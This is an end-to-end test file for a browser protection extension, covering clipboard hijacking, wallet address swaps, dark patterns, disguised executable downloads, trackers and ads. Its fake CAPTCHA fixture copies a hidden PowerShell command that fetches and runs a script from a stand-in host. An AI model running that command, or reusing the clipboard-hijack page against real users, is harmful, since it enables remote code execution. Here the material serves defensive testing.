// Page guards and tools, end to end: clipboard, notifications, wrapped links,
// affiliate links, story dates, session recorders, wallet swaps, dark
// patterns, downloads, x-ray, first-visit notes, "without Scout", evidence,
// modes and the activity log.
import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { launch, startServer, visit } from './harness.js';

let server, browser, port;
const url = (host, path) => `http://${host}:${port}${path}`;
const layer = (page, sel) => page.evaluate((sel) => document.querySelector('scout-layer')?.shadowRoot?.querySelectorAll(sel).length ?? 0, sel);
const stateOf = async (host) => {
  const all = await browser.ext.session();
  return Object.values(all).find((v) => v?.host === host);
};

before(async () => {
  server = await startServer({
    '/captcha': `<!doctype html><title>Verify</title><p>Verify you are human. Press Win + R, then Ctrl + V.</p>
      <textarea id="t" style="position:absolute;left:-999px">powershell -w hidden -c "iwr http://x.example/a.ps1 | iex"</textarea>
      <button id="go" onclick="t.select(); document.execCommand('copy')">I'm not a robot</button>`,
    '/install': `<!doctype html><title>Install</title><pre>curl -fsSL https://get.example.sh | bash</pre>
      <button id="go" onclick="document.addEventListener('copy', (e) => { e.clipboardData.setData('text/plain', 'curl -fsSL https://get.example.sh | bash'); e.preventDefault(); }, { once: true }); document.execCommand('copy')">Copy</button>`,
    '/spam': `<!doctype html><title>Spam</title><script>Notification.requestPermission().then((p) => (window.answer = p));</script>`,
    '/wrapped': () => ({ headers: { 'content-type': 'text/html' }, body: `<!doctype html><a id="out" href="https://www.google.com/url?q=${encodeURIComponent(url('dest.example', '/landing'))}&sa=U">Result</a>` }),
    '/landing': '<!doctype html><title>Landed</title><p>here</p>',
    '/story': () => ({
      headers: { 'content-type': 'text/html' },
      body: `<!doctype html><title>Old story</title>
        <meta property="og:type" content="article"><meta property="article:published_time" content="2019-03-12T08:00:00Z">
        <script src="${url('static.hotjar.com', '/c/hotjar-1.js')}"></script>
        <article><h1>The best espresso machines</h1><p>Our pick: <a id="aff" href="https://www.amazon.com/dp/B0?tag=site-20">this one</a>. Also <a id="plain" href="https://example.org/">a plain link</a>.</p></article>`,
    }),
    '/c/hotjar-1.js': '',
    '/wallet': `<!doctype html><title>Send</title><span id="addr">0x52908400098527886E0F7030069857D2E4169EE7</span><input id="to">`,
    '/shop': `<!doctype html><title>Shop</title><button>Add to cart</button><p>Hurry! Only 3 left in stock</p>
      <label><input type="checkbox" checked> Add shipping insurance ($4.99)</label>
      <span id="clock">09:59</span><script>let s = 599; setInterval(() => { s--; clock.textContent = '0' + Math.floor(s / 60) + ':' + String(s % 60).padStart(2, '0'); }, 300);</script>
      <a href="#">No thanks, I don't like saving money</a>`,
    '/invoice.pdf.exe': () => ({ headers: { 'content-type': 'application/octet-stream', 'content-disposition': 'attachment; filename="invoice.pdf.exe"' }, body: 'MZ' }),
    '/get': `<!doctype html><a id="dl" href="/invoice.pdf.exe">Download invoice</a>`,
    '/news': `<!doctype html><title>News</title>
      <script src="https://www.google-analytics.com/analytics.js"></script>
      <iframe id="adframe" src="https://securepubads.g.doubleclick.net/gampad/ads?x=1" width="300" height="250"></iframe>
      <ins class="adsbygoogle" style="display:block;width:300px;height:100px"></ins><p>Story text.</p>`,
    '/status/1': `<!doctype html><title>Post</title>
      ${['a', 'b', 'c', 'd', 'e'].map((u, i) => `<article data-testid="tweet"><div data-testid="User-Name"><a href="/${u}">${u}</a></div>
        <div data-testid="tweetText">${i === 0 ? 'Original post about the election results tonight' : i < 4 ? 'This candidate is the only one who truly cares about working families in our state' : 'I had pasta for dinner'}</div>
        <time datetime="2026-10-19T10:0${i}:00Z"></time><a href="/${u}/status/${i + 10}">link</a></article>`).join('')}`,
  });
  port = server.port;
  browser = await launch();
});
after(async () => {
  await browser?.close();
  server?.close();
});

test('a fake CAPTCHA cannot load a command onto the clipboard, and says why', async () => {
  const page = await visit(browser.context, url('verify.example', '/captcha'), 1200);
  await page.click('#go');
  await page.waitForTimeout(800);
  assert.equal(await layer(page, '.alarm'), 1, 'the on-page warning shows');
  const state = await stateOf('verify.example');
  assert.equal(state.level, 'stop');
  assert.ok(state.flags.some((f) => f.kind === 'clipboard-command' && f.severity === 'hard'));
  const activity = (await browser.ext.send({ type: 'getActivity' })).value;
  assert.ok(activity.some((a) => a.kind === 'clipboard' && a.tone === 'bad'));
});

test('an install page copying a command is noted, not blocked', async () => {
  const page = await visit(browser.context, url('install.example', '/install'), 1200);
  await page.click('#go');
  await page.waitForTimeout(800);
  assert.equal(await layer(page, '.alarm'), 0);
  const state = await stateOf('install.example');
  assert.ok(state.flags.some((f) => f.kind === 'clipboard-command' && f.severity === 'info'));
});

test('a notification prompt before any click is held back', async () => {
  const page = await visit(browser.context, url('spam.example', '/spam'), 1500);
  assert.equal(await page.evaluate(() => window.answer), 'default');
  assert.ok((await stateOf('spam.example')).flags.some((f) => f.kind === 'notification-prompt'));
});

test('a wrapped Google link goes straight to its destination', async () => {
  const page = await visit(browser.context, url('www.google.com', '/wrapped'), 800);
  await Promise.all([page.waitForURL(/dest\.example/), page.click('#out')]);
  assert.equal(new URL(page.url()).hostname, 'dest.example');
  assert.ok(!server.seen.some((r) => r.url.startsWith('/url')), 'the redirect was never requested');
});

test('an old story is dated, its affiliate link marked, its session recorder blocked', async () => {
  const page = await visit(browser.context, url('reviews.example', '/story'), 2500);
  assert.match(await page.textContent('.scout-date'), /From 2019.*Published Mar 12, 2019/);
  assert.equal(await page.getAttribute('#aff', 'data-scout-aff'), 'Amazon');
  assert.equal(await page.getAttribute('#plain', 'data-scout-aff'), null);
  assert.ok(!server.seen.some((r) => r.url === '/c/hotjar-1.js'), 'the recorder never loaded');
  const state = await stateOf('reviews.example');
  assert.deepEqual(state.guard.replay, ['Hotjar']);
  assert.equal(state.guard.replayBlocked, true);
  assert.equal(state.guard.affiliates.total, 1);
  assert.ok(state.flags.some((f) => f.kind === 'date'));
});

test('a pasted wallet address that differs from the copied one is caught', async () => {
  const page = await visit(browser.context, url('wallet.example', '/wallet'), 1000);
  await page.evaluate(() => {
    getSelection().selectAllChildren(document.getElementById('addr'));
    document.dispatchEvent(new ClipboardEvent('copy', { bubbles: true }));
  });
  await page.waitForTimeout(400);
  await page.evaluate(() => {
    const data = new DataTransfer();
    data.setData('text/plain', '0x5290aaaa098527886E0F7030069857D2E4169EE7');
    document.getElementById('to').dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }));
  });
  await page.waitForTimeout(800);
  assert.equal(await layer(page, '.warn'), 1);
  assert.ok((await stateOf('wallet.example')).flags.some((f) => f.kind === 'address-swap' && f.severity === 'hard'));
});

test('dark patterns on a shop page are named and outlined', async () => {
  const page = await visit(browser.context, url('deals.example', '/shop'), 5000);
  const kinds = (await stateOf('deals.example')).flags.map((f) => f.kind);
  for (const k of ['dark:timer', 'dark:scarcity', 'dark:prechecked', 'dark:shaming']) assert.ok(kinds.includes(k), `${k} in ${kinds}`);
  assert.ok((await page.$$('[data-scout-dark]')).length >= 3);
});

test('a document that is really a program is paused before it finishes', async () => {
  const page = await visit(browser.context, url('files.example', '/get'), 800);
  await page.click('#dl').catch(() => {});
  await page.waitForTimeout(2000);
  const items = await browser.probe.evaluate(() => chrome.downloads.search({ filenameRegex: 'invoice' }));
  assert.ok(items.length, 'the download started');
  assert.ok(items.every((d) => d.paused || d.state === 'interrupted'), JSON.stringify(items.map((d) => [d.state, d.paused])));
  const activity = (await browser.ext.send({ type: 'getActivity' })).value;
  assert.ok(activity.some((a) => a.kind === 'download'));
});

test('x-ray outlines blocked ad spots; first-visit note shows; request log names companies', async () => {
  const page = await visit(browser.context, url('www.daily-news.example', '/news'), 4000);
  assert.equal(await layer(page, '.toast'), 1, 'first-visit note');
  const state = await stateOf('www.daily-news.example');
  assert.ok(state.requests.some((r) => r.list === 'ads' && /doubleclick/.test(r.host)));
  assert.ok(state.requests.some((r) => r.list === 'trackers' && r.company));
  const tabId = Number(Object.entries(await browser.ext.session()).find(([, v]) => v?.host === 'www.daily-news.example')[0].slice(4));
  await browser.ext.send({ type: 'xray', tabId, on: true });
  await page.waitForTimeout(500);
  assert.ok((await layer(page, '.box')) >= 2, 'ad frame and ad slot outlined');
  assert.equal(await layer(page, '.legend'), 1);
  await browser.ext.send({ type: 'xray', tabId, on: false });
  await page.waitForTimeout(300);
  assert.equal(await layer(page, '.box'), 0);

  // Without Scout: the same page, unblocked, then restored.
  await browser.ext.send({ type: 'peek', tabId, on: true });
  await page.waitForTimeout(2500);
  assert.equal((await browser.probe.evaluate(() => chrome.storage.local.get('peek'))).peek.domain, 'daily-news.example');
  await browser.ext.send({ type: 'peek', tabId, on: false });
  assert.equal((await browser.probe.evaluate(() => chrome.storage.local.get('peek'))).peek, undefined);
  const rules = await browser.probe.evaluate(() => chrome.declarativeNetRequest.getDynamicRules());
  assert.ok(!rules.some((r) => r.id === 19_990 || r.id === 19_991));
});

test('evidence: page, screenshot and a signed record land in Downloads', async () => {
  const page = await visit(browser.context, url('evidence.example', '/landing'), 800);
  await page.bringToFront();
  const tabId = Number(Object.entries(await browser.ext.session()).find(([, v]) => v?.host === 'evidence.example')[0].slice(4));
  const res = await browser.ext.send({ type: 'saveEvidence', tabId });
  assert.ok(res.ok, res.error);
  await page.waitForTimeout(1500);
  const files = await browser.probe.evaluate(() => chrome.downloads.search({ filenameRegex: 'Scout evidence' }));
  assert.deepEqual(files.map((f) => f.filename.split(/[\\/]/).pop()).sort(), ['evidence.json', 'page.html', 'screenshot.png']);
  assert.match(res.value.hashes['page.html'], /^[0-9a-f]{64}$/);
});

test('quiet mode keeps protection and drops the marks', async () => {
  await browser.ext.send({ type: 'saveShields', changes: { mode: 'quiet' } });
  const page = await visit(browser.context, url('reviews2.example', '/story'), 2500);
  assert.equal(await page.$('.scout-date'), null);
  assert.equal(await page.getAttribute('#aff', 'data-scout-aff'), null);
  assert.ok(!server.seen.some((r) => r.url === '/c/hotjar-1.js'), 'still blocked');
  await browser.ext.send({ type: 'saveShields', changes: { mode: 'balanced' } });
});

test('X: replies sharing wording are marked', async () => {
  const page = await visit(browser.context, url('x.com', '/status/1'), 3000);
  const marked = await page.$$eval('[data-scout-similar]', (els) => els.length);
  assert.equal(marked, 3);
});
